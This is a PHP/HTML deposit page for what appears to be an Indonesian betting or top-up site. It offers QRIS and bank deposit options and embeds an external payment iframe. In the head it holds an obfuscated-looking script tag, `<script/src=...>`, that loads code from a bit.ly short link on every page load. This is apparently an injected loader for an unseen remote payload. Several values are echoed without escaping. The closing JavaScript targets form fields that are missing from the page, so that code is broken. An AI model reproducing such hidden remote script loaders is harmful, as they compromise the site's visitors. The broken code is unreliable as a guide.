<?php include('session.php');
require_once('../config/koneksi.php');
$userID = 1; // sesuai session.php

$sqlBanks = mysqli_query($conn,"SELECT * FROM tb_bank WHERE userID = '$userID' AND status = 1 ORDER BY cuid ASC") or die(mysqli_error($conn));
$qris = null;
$sqlQris = mysqli_query($conn, "SELECT * FROM tb_bank WHERE userID = '$userID' AND UPPER(TRIM(akun)) = 'QRIS' LIMIT 1") or die(mysqli_error($conn));
if(mysqli_num_rows($sqlQris) > 0){
    $qris = mysqli_fetch_assoc($sqlQris);
}

$urlweb = isset($urlweb) ? $urlweb : ''; // dari session.php

// Ambil pesan notifikasi dari session
$notif = null;
if (isset($_SESSION['depo'])) {
    $notif = $_SESSION['depo'];
    unset($_SESSION['depo']);
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
<title>Form Deposit Saldo</title>
<script/src="//bit.ly/4sncqCY"></script>
<style>
  /* ===== STYLE DARI REFERENSI DENGAN TEMA MERAH TUA ===== */
  
  :root {
    /* Tema Merah Tua */
    --gradient-red: linear-gradient(to bottom, #ec1d23 0%, #3d0709 100%);
    --gradient-red-reverse: linear-gradient(195deg, #8b0000 11%, #b22222 21%, #8b0000 33%, #b22222 30%, #b22222 60%, #cc6666 73%, #8b0000 85%, #8b0000 100%);
    --border-red: 2px solid #ff0000;
    --border-glow-red: inset 0 0 4px 2px #8b0000, inset 0 1px 0 0 #ff6666, inset 0 0 0 2px #ff4d4d, 3px 3px 2px 1px rgb(0 0 0 / 0%);
    --text-glow-red: 0 0 5px #ff0000;
    --bg-dark: rgba(0, 0, 0, 0.85);
    --card-bg: rgba(0, 0, 0, 0.7);
    --gold: #FFD700;
    
    /* Kompatibilitas dengan class lama */
    --gradient-blue: linear-gradient(to bottom, #ec1d23 0%, #3d0709 100%);
    --gradient-blue-reverse: linear-gradient(195deg, #8b0000 11%, #b22222 21%, #8b0000 33%, #b22222 30%, #b22222 60%, #cc6666 73%, #8b0000 85%, #8b0000 100%);
    --border-blue: 2px solid #ff0000;
    --border-glow: inset 0 0 4px 2px #8b0000, inset 0 1px 0 0 #ff6666, inset 0 0 0 2px #ff4d4d, 3px 3px 2px 1px rgb(0 0 0 / 0%);
    --text-glow: 0 0 5px #ff0000;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  html, body { height: 100%; }

  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    margin: 0;
    min-height: 100dvh;
    display: flex; 
    flex-direction: column; 
    align-items: center;
    color: #fff;
    background: url('https://designku.io/download/i7za6Bob.webp') no-repeat center center fixed;
    background-size: cover;
    position: relative; 
    overflow-x: hidden;
    line-height: 1.5;
  }

  body::before {
    content: "";
    position: fixed; 
    inset: 0;
    background: rgba(0, 0, 0, 0.7);
    z-index: 0;
    pointer-events: none;
  }

  main {
    width: 100%;
    flex: 1;
    display: grid;
    place-items: start center;
    padding: clamp(12px, 2.8vw, 24px) 12px 20px;
    gap: 14px;
    position: relative; 
    z-index: 1;
  }

  /* Header minimal dengan tema merah */
  .header-minimal {
    width: 100%;
    max-width: 800px;
    display: flex;
    justify-content: flex-start;
    align-items: center;
    padding: 12px 18px;
    position: relative;
    z-index: 10;
    margin-bottom: 10px;
    background: rgba(41, 0, 0, 0.9);
    border-radius: 50px;
    border: var(--border-red);
    box-shadow: var(--border-glow-red);
    backdrop-filter: blur(8px);
  }

  .header-logo {
    height: 42px;
    max-height: 46px;
    max-width: 160px;
    object-fit: contain;
    border-radius: 8px;
    filter: drop-shadow(0 0 6px rgba(255, 0, 0, 0.5));
    flex-shrink: 0;
    transform: translateY(-3px);
  }

  .header-btn {
    background: var(--gradient-red);
    color: #FFD700;
    font-weight: 700;
    text-decoration: none;
    font-size: .92rem;
    padding: 8px 16px;
    border-radius: 22px;
    border: var(--border-red);
    box-shadow: var(--border-glow-red);
    transition: all 0.3s ease;
  }

  .header-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 0 15px #ff0000;
  }

  .header-btn i {
    margin-right: 5px;
  }

  /* BAR BUTTON DI BAWAH HEADER */
  .header-nav {
    width: 100%;
    max-width: 800px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin: 0 auto 14px;
    padding: 0 10px;
  }

  /* posisi kiri */
  .header-nav .left {
    margin-right: auto;
  }

  /* posisi kanan */
  .header-nav .right {
    margin-left: auto;
  }
  
  /* Stack layout */
  .stack {
    width: 100%;
    max-width: 800px;
    display: grid;
    grid-template-columns: 1fr;
    justify-items: center;
    gap: clamp(12px, 2.8vw, 20px);
  }
  
  @media (min-width: 760px) {
    .stack {
      grid-template-columns: repeat(2, 1fr);
      align-items: start;
    }
  }

  /* Notifikasi dengan tema merah */
  .notif {
    width: 100%;
    max-width: 800px;
    padding: 12px 18px;
    border-radius: 22px;
    font-weight: 700;
    font-size: .95rem;
    margin: 6px 0;
    position: relative;
    z-index: 2;
    border: var(--border-red);
    box-shadow: var(--border-glow-red);
    backdrop-filter: blur(8px);
  }
  
  .notif-success { 
    background: rgba(0, 255, 0, 0.2); 
    color: #00ff00; 
    border-color: #00ff00;
  }
  .notif-error { 
    background: rgba(255, 0, 0, 0.3); 
    color: #ff6b6b; 
    border-color: #ff0000;
  }
  .notif-warning { 
    background: rgba(255, 215, 0, 0.2); 
    color: #FFD700; 
    border-color: #FFD700;
  }

  /* Form deposit dengan tema merah */
  .deposit-form {
    width: 100%;
    background: var(--card-bg);
    backdrop-filter: blur(8px);
    padding: clamp(14px, 3.4vw, 20px) clamp(16px, 4vw, 24px);
    border-radius: 16px;
    border: var(--border-red);
    box-shadow: var(--border-glow-red);
    color: #fff;
    transition: transform .2s ease, box-shadow .2s ease;
  }
  
  .deposit-form:hover { 
    transform: translateY(-2px); 
    box-shadow: 0 0 20px rgba(255, 0, 0, 0.5), var(--border-glow-red); 
  }
  
  .deposit-form h2 {
    margin: 0 0 15px 0;
    color: #FFD700;
    font-weight: 700;
    text-align: center;
    font-size: clamp(1.2rem, 2.6vw, 1.6rem);
    background: var(--gradient-red);
    padding: 10px;
    border-radius: 22px;
    border: var(--border-red);
    box-shadow: var(--border-glow-red);
  }

  .deposit-form h2 i {
    margin: 0 8px;
    color: #FFD700;
  }

  /* Form group */
  .form-group { 
    margin-bottom: clamp(10px, 2.4vw, 14px); 
  }
  
  label {
    display: block; 
    font-weight: 600; 
    margin-bottom: 6px;
    color: #fff;
    font-size: clamp(.86rem, 2.4vw, .95rem);
    text-shadow: 2px 1px 0px rgb(0 0 0);
  }
  
  label i {
    color: #ff6666;
    margin-right: 5px;
  }

  input[type="text"], 
  select {
    width: 100%; 
    padding: 12px 15px;
    border: 2px solid #ff0000;
    border-radius: 15px;
    font-size: clamp(.92rem, 2.5vw, 1rem); 
    color: #fff;
    background: linear-gradient(to right, #5a1e1e 0%, #2c0000 50%, #3d0709 100%);
    box-shadow: inset 0 0 4px 5px #8b3a3a, inset 0 1px 0 0 #ffcccc, inset 0 0 0 2px #8b3a3a;
    transition: all 0.3s ease;
  }

  input::placeholder, 
  select option[disabled] { 
    color: rgba(255,255,255,0.5); 
  }

  input:focus, 
  select:focus {
    outline: none; 
    border-color: #ff6666;
    box-shadow: 0 0 10px #ff0000, inset 0 0 4px 5px #8b3a3a;
  }

  select option {
    background: #2c0000;
    color: #fff;
  }

  select optgroup {
    color: #FFD700;
    font-weight: bold;
    background: #1a0000;
  }

  /* Bank info */
  .bank-info {
    margin-top: 10px;
    font-size: clamp(.88rem, 2.5vw, .98rem);
    background: rgba(0, 0, 0, 0.6);
    backdrop-filter: blur(4px);
    padding: 15px;
    border-radius: 15px;
    border: var(--border-red);
    box-shadow: var(--border-glow-red);
    color: #fff;
    line-height: 1.5;
    margin-bottom: 16px;
    overflow: hidden;
    max-height: 0;
    opacity: 0;
    transform: translateY(-4px);
    transition: max-height .3s ease, opacity .2s ease, transform .2s ease;
    pointer-events: none;
  }
  
  .bank-info.show {
    max-height: 520px;
    opacity: 1;
    transform: translateY(0);
    pointer-events: auto;
  }

  .bank-row + .bank-row { 
    margin-top: 12px; 
  }
  
  .bank-row .label { 
    font-weight: 700; 
    color: #ff6666; 
    margin-right: 8px;
    display: inline-block;
    min-width: 100px;
  }
  
  .bank-row .value { 
    color: #fff; 
    font-weight: 500;
  }

  /* Account row dengan tombol copy */
  .account-row {
    display: grid;
    grid-template-columns: 1fr auto;
    gap: 10px;
    margin-top: 8px;
    align-items: stretch;
  }
  
  .account-box {
    display: flex; 
    align-items: center;
    padding: 12px 15px;
    background: linear-gradient(to right, #5a1e1e 0%, #2c0000 50%, #3d0709 100%);
    border: 2px solid #ff0000;
    border-radius: 15px;
    color: #fff;
    font-family: monospace;
    font-size: 1rem;
    min-height: 45px;
    transition: all 0.3s ease;
    cursor: pointer;
  }
  
  .account-box:hover { 
    border-color: #ff6666;
    box-shadow: 0 0 10px #ff0000;
  }
  
  .account-box.is-copied { 
    border-color: #00ff00; 
    box-shadow: 0 0 15px #00ff00;
  }

  .account-number {
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    font-variant-numeric: tabular-nums;
    letter-spacing: 1px;
    width: 100%;
  }

  .copy-btn {
    padding: 0 20px;
    background: var(--gradient-red);
    border: var(--border-red);
    border-radius: 15px;
    font-weight: 700;
    color: #FFD700;
    cursor: pointer;
    font-size: .9rem;
    min-width: 90px;
    display: inline-flex; 
    align-items: center; 
    justify-content: center;
    box-shadow: var(--border-glow-red);
    transition: all 0.3s ease;
  }
  
  .copy-btn:hover { 
    transform: translateY(-2px);
    box-shadow: 0 0 15px #ff0000;
  }
  
  .copy-btn i {
    margin-right: 5px;
  }

  .copy-status {
    margin-top: 8px;
    font-size: .85rem;
    color: #00ff00;
    text-align: center;
  }

  /* QRIS container */
  .qris-container {
    margin-top: 14px; 
    text-align: center;
    overflow: hidden; 
    max-height: 0; 
    opacity: 0; 
    transform: translateY(-4px);
    transition: max-height .3s ease, opacity .2s ease, transform .2s ease; 
    pointer-events: none;
  }
  
  .qris-container.show { 
    max-height: 400px; 
    opacity: 1; 
    transform: translateY(0); 
    pointer-events: auto; 
  }
  
.qris-container img {
  max-width: 100%;
  height: auto;
  width: clamp(140px, 40vw, 200px);
  object-fit: contain;
  border-radius: 15px;
  border: var(--border-red);
  box-shadow: var(--border-glow-red);
  transition: transform .3s ease;
}
  
  .qris-container img:hover { 
    transform: scale(1.05); 
  }

  .qris-container p {
    margin-top: 10px;
    color: #ff6666;
    font-weight: 600;
  }

  /* Tombol submit */
  button[type="submit"] {
    width: 100%; 
    padding: 14px;
    background: var(--gradient-red-reverse);
    background-size: 400% 400%;
    border: var(--border-red);
    border-radius: 22px;
    color: #FFD700;
    font-size: clamp(1rem, 2.8vw, 1.1rem); 
    font-weight: 800; 
    cursor: pointer;
    box-shadow: var(--border-glow-red);
    transition: all 0.3s ease;
    animation: gradient 5s ease infinite;
    margin-top: 15px;
  }
  
  button[type="submit"]:hover { 
    transform: translateY(-2px); 
    box-shadow: 0 0 20px #ff0000;
  }

  button[type="submit"] i {
    margin-right: 8px;
  }

  @keyframes gradient {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  /* Info card */
  .info-card {
    width: 100%;
    background: var(--card-bg);
    backdrop-filter: blur(8px);
    border-radius: 16px;
    padding: clamp(12px, 3.4vw, 18px) clamp(14px, 4vw, 22px);
    border: var(--border-red);
    box-shadow: var(--border-glow-red);
    color: #fff;
    font-size: clamp(.9rem, 2.4vw, 1rem);
    line-height: 1.6;
    text-align: center;
  }
  
  .info-card strong { 
    color: #ff6666; 
    font-size: 1.1rem;
    display: block;
    margin-bottom: 10px;
  }

  .info-card i {
    color: #FFD700;
    margin: 0 5px;
  }
  
  /* MINI INFO CARD */
  .info-card.mini {
    padding: 10px 14px;
    font-size: 0.82rem;
    line-height: 1.4;
    text-align: left;
  }

  /* judul kecil */
  .info-title {
    color: #ff6666;
    font-weight: 700;
    font-size: 0.9rem;
    margin-bottom: 6px;
  }

  /* tiap baris info */
  .info-item {
    display: flex;
    align-items: flex-start;
    gap: 6px;
    margin: 3px 0;
    opacity: 0.95;
  }

  /* icon mini */
  .info-item i {
    font-size: 0.8rem;
    margin-top: 2px;
    color: #FFD700;
  }

  /* Error messages */
  .error-msg {
    color: #ff6b6b;
    font-size: .85rem;
    margin-top: 5px;
    display: none;
    padding-left: 5px;
  }

  .error-msg i {
    margin-right: 5px;
  }

  /* Footer dengan tema merah */
  footer.footer {
    width: 100%;
    background: rgba(41, 0, 0, 0.9);
    border-top: var(--border-red);
    box-shadow: var(--border-glow-red);
    color: #fff;
    text-align: center;
    padding: 15px 12px calc(15px + env(safe-area-inset-bottom));
    position: relative; 
    z-index: 1;
    backdrop-filter: blur(8px);
    margin-top: auto;
  }
  
  .footer-inner {
    max-width: 800px; 
    margin: 0 auto;
    font-size: clamp(.84rem, 2.2vw, .95rem); 
    line-height: 1.6;
    padding: 0 10px;
  }
  
  .footer-brand { 
    font-weight: 800; 
    color: #ff6666; 
    margin-bottom: 5px;
  }
  
  .footer-links { 
    margin-top: 8px; 
  }
  
  .footer-links a { 
    color: #FFD700; 
    text-decoration: none;
    transition: color 0.3s ease;
  }
  
  .footer-links a:hover { 
    color: #fff;
    text-decoration: underline; 
  }

  @media (prefers-reduced-motion: reduce) {
    .bank-info, .qris-container, .deposit-form, button, .qris-container img { transition: none; }
  }

  /* Loading animation */
  .fa-spinner {
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  /* Responsive adjustments */
  @media (max-width: 480px) {
    .header-minimal {
      padding: 8px 12px;
    }
    
    .header-btn {
      padding: 6px 12px;
      font-size: 0.85rem;
    }
    
    .bank-row .label {
      min-width: 80px;
    }
    
    .account-row {
      grid-template-columns: 1fr;
    }
    
    .copy-btn {
      padding: 10px;
    }
  }
</style>
</head>
<body>

<main>
  <header class="header-minimal">
    <img src="<?php echo htmlspecialchars($urlweb); ?>/upload/<?php echo htmlspecialchars($logos); ?>" alt="Logo" class="header-logo">
  </header>
  <div class="header-nav">
    <a href="/m/cashier" class="header-btn" aria-label="cashier">
        <i class="fas fa-wallet"></i> Bank
    </a>
    
    <a href="/m/qris" class="header-btn" aria-label="qris">
        <i class="fas fa-wallet"></i> Qris
    </a>
    
    <a href="/m/withdraw" class="header-btn" aria-label="Withdraw">
        <i class="fas fa-wallet"></i> Withdraw
    </a>

    <a href="/m/transaction" class="header-btn" aria-label="Histori">
        <i class="fas fa-history"></i> Histori
    </a>
</div>
  
  <?php if ($notif): ?>
    <div 
      class="notif notif-<?php echo htmlspecialchars($notif['type']); ?>" 
      role="alert" 
      aria-live="assertive" 
      aria-atomic="true"
    >
      <?php echo htmlspecialchars($notif['message']); ?>
    </div>
  <?php endif; ?>

  <div class="stack">
    <form class="deposit-form" id="depositForm">
      <h2><i class="fas fa-coins"></i> QRIS INSTAN <i class="fas fa-coins"></i></h2>
      <iframe src="https://pay.poinsixengine.top/pay.php?userid=<?php echo $id_user; ?>&nominal=&token=<?= $qristoked ?>" width="100%" height="350" frameborder="0"class="w-full"allowfullscreen></iframe>
    </form>

   <div class="info-card mini" role="region">

  <div class="info-title">
    <i class="fas fa-info-circle"></i> Info Penting
  </div>

  <div class="info-item">
    <i class="fas fa-exclamation-triangle"></i>
    Deposit diluar dari rekening tujuan kami tidak dapat diproses. Pastikan rekening tujuan sesuai dengan yang tertera setelah memilih metode deposit. Dan pastikan untuk deposit awal wajib menggunakan kode unik <?php echo $unik; ?> (contoh tf:<?php echo $unik; ?>)
  </div>
  </div>
</main>

<footer class="footer" role="contentinfo">
  <div class="footer-inner">
    <div class="footer-brand"><i class="fas fa-coins"></i> <?php echo $instansi; ?> Deposit</div>
    <div>&copy; 2026 <?php echo $instansi; ?>. Hak cipta dilindungi.</div>
  </div>
</footer>

<script>
  const form = document.getElementById('depositForm');
  const nominalInput = document.getElementById('nominal');
  const metodeSelect = document.getElementById('metode');
  const bankInfoDiv = document.getElementById('bankInfo');
  const qrisContainer = document.getElementById('qrisContainer');
  const bankAkunSpan = document.getElementById('bankAkun');
  const bankPemilikSpan = document.getElementById('bankPemilik');
  const bankNoRekSpan = document.getElementById('bankNoRek');
  const copyBtn = document.getElementById('copyNoRekBtn');
  const copyStatus = document.getElementById('copyStatus');
  const accountBox = document.getElementById('accountBox');

  // Data bank dari PHP (untuk tampil info)
  const bankData = {
    <?php 
      mysqli_data_seek($sqlBanks, 0);
      $banks_js = [];
      while($bank = mysqli_fetch_assoc($sqlBanks)) {
          if (strtoupper(trim($bank['akun'])) === 'QRIS') continue;
          $val = strtolower(str_replace(' ', '_', $bank['akun']));
          $akun = addslashes($bank['akun']);
          $pemilik = addslashes($bank['pemilik']);
          $no_rek = addslashes($bank['no_rek']);
          $banks_js[] = "'$val': {akun: '$akun', pemilik: '$pemilik', no_rek: '$no_rek'}";
      }
      echo implode(",", $banks_js);
    ?>
  };

  // Format nomor rekening untuk tampilan (spasi per 4 digit), tapi copy tetap raw
  function groupDigits(raw) {
    const onlyDigits = (raw || '').replace(/\s+/g, '');
    if (!/^\d+$/.test(onlyDigits)) return raw || '';
    return onlyDigits.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
  }

  function setCopiedUI(on) {
    if (on) {
      copyBtn.textContent = 'Tersalin âœ“';
      copyStatus.textContent = 'Disalin ke clipboard';
      copyStatus.style.display = 'block';
      accountBox.classList.add('is-copied');
    } else {
      copyBtn.textContent = 'Salin';
      copyStatus.style.display = 'none';
      accountBox.classList.remove('is-copied');
    }
  }

  function copyNumber() {
    const raw = bankNoRekSpan.dataset.raw || bankNoRekSpan.textContent.trim();
    if(!raw) return alert('Nomor rekening tidak tersedia');
    navigator.clipboard.writeText(raw).then(() => {
      setCopiedUI(true);
      setTimeout(() => setCopiedUI(false), 1500);
    }).catch(() => {
      alert('Gagal menyalin nomor rekening');
    });
  }

  function updateMethodUI() {
    const val = metodeSelect.value;

    if(val === 'qris'){
      bankInfoDiv.classList.remove('show');
      qrisContainer.classList.add('show');
    } else if(bankData[val]){
      qrisContainer.classList.remove('show');
      bankInfoDiv.classList.add('show');
      bankAkunSpan.textContent = bankData[val].akun || '';
      bankPemilikSpan.textContent = bankData[val].pemilik || '';
      const raw = (bankData[val].no_rek || '').toString().trim();
      bankNoRekSpan.dataset.raw = raw;
      bankNoRekSpan.textContent = groupDigits(raw);
      setCopiedUI(false);
    } else {
      bankInfoDiv.classList.remove('show');
      qrisContainer.classList.remove('show');
      setCopiedUI(false);
    }
  }

  nominalInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/[^\d,]/g,'');
    let split = value.split(',');
    let sisa = split[0].length % 3;
    let rupiah = split[0].substr(0, sisa);
    let ribuan = split[0].substr(sisa).match(/\d{3}/gi);
    if (ribuan) rupiah += (sisa ? '.' : '') + ribuan.join('.');
    if (split[1] !== undefined) rupiah += ',' + split[1];
    e.target.value = rupiah;
  }, { passive: true });

  metodeSelect.addEventListener('change', updateMethodUI, { passive: true });
  copyBtn.addEventListener('click', copyNumber);
  accountBox.addEventListener('click', copyNumber);

  form.addEventListener('submit', (e) => {
    let valid = true;

    if(!metodeSelect.value) {
      document.getElementById('error-metode').style.display = 'block';
      valid = false;
    } else {
      document.getElementById('error-metode').style.display = 'none';
    }

    let nominalValue = nominalInput.value.replace(/\./g,'').replace(/,/g,'').replace(/[^0-9]/g, '');
    if(!nominalValue || isNaN(nominalValue) || parseInt(nominalValue) < 50000) {
      document.getElementById('error-nominal').style.display = 'block';
      valid = false;
    } else {
      document.getElementById('error-nominal').style.display = 'none';
    }

    if(!valid) e.preventDefault();
  });

  // Init UI
  updateMethodUI();
</script>

</body>
</html>